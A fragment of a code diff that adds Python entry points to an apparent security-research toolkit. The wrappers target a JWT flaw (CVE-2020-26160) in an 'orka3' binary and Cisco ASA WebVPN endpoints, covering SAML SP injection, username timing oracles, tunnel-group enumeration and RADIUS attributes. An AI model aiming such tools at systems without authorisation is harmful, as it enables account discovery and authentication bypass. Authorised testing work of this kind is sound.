+            'auth_function_addresses': addrs,
+            'rodata_secrets': secrets,
+            'section_map': {k: [hex(v[0]), hex(v[1])] for k, v in self.SECTION_MAP.items()},
+            'findings': findings,
+        }
+
+
+def analyze_orka_jwt(binary_path: str = '/home/cowboy/VDT/tools/orka3/orka3') -> dict:
+    """CVE-2020-26160 + empty-secret HS256 analysis for orka3."""
+    return OrkaJWTRE(binary_path).run()
+
+
+# ---------------------------------------------------------------------------
+# Extended top-level entry points
+# ---------------------------------------------------------------------------
+
+def analyze_saml_sp(host: str, port: int = 443) -> dict:
+    """SAML SP injection RE against a Cisco ASA WebVPN endpoint."""
+    return SAMLSpInjectionRE(host, port).run()
+
+
+def analyze_username_oracle(host: str, port: int = 443,
+                            candidates: list = None, tunnel_group: str = '') -> dict:
+    """Username timing oracle via POST /+webvpn+/index.html."""
+    return UsernameTimingOracleRE(host, port).run(candidates=candidates, tunnel_group=tunnel_group)
+
+
+def analyze_tunnel_groups(host: str, port: int = 443,
+                          extra_aliases: list = None) -> dict:
+    """Enumerate tunnel groups and connection profiles."""
+    return TunnelGroupEnumRE(host, port).run(extra_aliases=extra_aliases)
+
+
+def analyze_radius_class_attr(host: str, port: int = 443) -> dict:
+    """RADIUS class attr 25 attack surface RE."""
+    return RADIUSClassAttrRE(host, port).run()
